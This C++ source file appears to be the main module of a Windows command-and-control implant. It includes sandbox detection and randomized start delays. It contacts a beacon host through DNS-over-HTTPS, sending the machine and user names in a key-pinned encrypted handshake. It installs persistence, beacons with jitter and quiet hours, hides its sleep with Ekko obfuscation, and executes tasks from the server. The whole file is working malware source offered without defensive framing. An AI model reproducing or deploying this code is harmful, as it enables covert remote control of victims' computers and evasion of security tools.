#include "config.h"
#include "doh_resolver.h"
#include "ekko.h"
#include "evade.h"
#include "persistence.h"
#include "tasks.h"
#include "transport.h"
#include "shared/crypto.h"
#include "shared/proto.h"

#include <windows.h>

#include <chrono>
#include <cstdio>
#include <cstring>
#include <mutex>
#include <random>
#include <string>
#include <thread>
#include <vector>

namespace {

std::mutex g_mtx;
std::vector<uint8_t> g_key;
std::string g_sid;
transport::Endpoint g_ep;

std::string HostName() {
    char buf[256] = {0};
    DWORD sz = sizeof(buf);
    GetComputerNameA(buf, &sz);
    return buf;
}

std::string UserName() {
    char buf[256] = {0};
    DWORD sz = sizeof(buf);
    GetUserNameA(buf, &sz);
    return buf;
}

bool EqPin(const std::vector<uint8_t>& pub) {
    return pub.size() == 32 && std::memcmp(pub.data(), cfg::kServerPin, 32) == 0;
}

bool Hello() {
    auto ips = doh::Resolve(cfg::kBeaconHost);
    if (ips.empty()) return false;
    g_ep.host = cfg::kBeaconHost;
    g_ep.ip   = doh::PickOne(ips);
    g_ep.path = cfg::kBeaconPath;
    g_ep.port = cfg::kBeaconPort;

    auto kp = crypto::GenerateX25519();
    transport::Result r = transport::Post(g_ep, kp.pub, "", int(proto::Op::Hello),
        { {"X-Host", HostName()}, {"X-User", UserName()}, {"X-Os", "windows"} });
    if (!r.ok) return false;

    auto key = crypto::DeriveSessionKey(kp.priv, std::vector<uint8_t>(cfg::kServerPin, cfg::kServerPin + 32), cfg::kInfo);

    std::vector<uint8_t> plain;
    if (!crypto::Open(key, r.body, plain)) return false;
    if (plain.size() < 32) return false;

    std::vector<uint8_t> server_pub(plain.begin(), plain.begin() + 32);
    if (!EqPin(server_pub)) return false;

    std::string sid(plain.begin() + 32, plain.end());
    if (sid.size() != 32) return false;

    {
        std::lock_guard<std::mutex> lk(g_mtx);
        g_key = key;
        g_sid = sid;
    }
    return true;
}

bool InQuietHours() {
    SYSTEMTIME st{};
    GetLocalTime(&st);
    return st.wHour >= cfg::kQuietStartH && st.wHour < cfg::kQuietEndH;
}

uint32_t NextSleepMs() {
    if (InQuietHours()) return uint32_t(cfg::kQuietSleepMs);
    std::mt19937 rng(GetTickCount());
    int j = cfg::kJitterPct;
    std::uniform_int_distribution<int> d(-j, j);
    return uint32_t(int(tasks::sleep_ms) + int(tasks::sleep_ms) * d(rng) / 100);
}

void DoSleep(uint32_t ms) {
    if (cfg::kUseEkko && ekko::Init())
        ekko::SleepObfuscated(ms, 0);
    else
        Sleep(ms);
}

bool Cycle(bool send_result, const std::vector<uint8_t>& result_payload, uint32_t result_task_id) {
    std::vector<uint8_t> key;
    std::string sid;
    {
        std::lock_guard<std::mutex> lk(g_mtx);
        key = g_key;
        sid = g_sid;
    }
    if (key.empty() || sid.empty()) return false;

    proto::Message m;
    m.header.session_id = sid;
    if (send_result) {
        m.header.op      = uint8_t(proto::Op::Result);
        m.header.task_id = result_task_id;
        m.payload        = result_payload;
    } else {
        m.header.op = uint8_t(proto::Op::Beacon);
    }

    auto wire = proto::Encode(m);
    std::vector<uint8_t> env;
    try { env = crypto::Seal(key, wire); } catch (...) { return false; }

    transport::Result r = transport::Post(g_ep, env, sid, int(m.header.op), {});
    if (!r.ok && r.status == 404) {
        return Hello();
    }
    if (!r.ok) return false;

    std::vector<uint8_t> plain;
    if (!crypto::Open(key, r.body, plain)) return false;

    proto::Message in;
    if (!proto::Decode(plain.data(), plain.size(), in)) return false;
    if (in.header.op == uint8_t(proto::Op::NoTask)) return true;

    tasks::Inbound t;
    t.op       = in.header.op;
    t.task_id  = in.header.task_id;
    t.payload  = std::move(in.payload);

    std::vector<uint8_t> out;
    if (!tasks::Execute(t, out)) return true;

    return Cycle(true, out, t.task_id);
}

void EnsurePersistence() {
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    pers::Install(path);
}

}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (cfg::kSandboxGate && evade::LooksLikeSandbox())
        return 0;

    std::mt19937 rng(GetTickCount());
    std::uniform_int_distribution<int> d(5000, 45000);
    Sleep(DWORD(d(rng)));

    while (!Hello())
        Sleep(30000 + DWORD(rng() % 30000));

    EnsurePersistence();

    while (true) {
        bool ok = Cycle(false, {}, 0);
        if (!ok) {
            DoSleep(60000);
            Hello();
            continue;
        }
        DoSleep(NextSleepMs());
    }
    return 0;
}
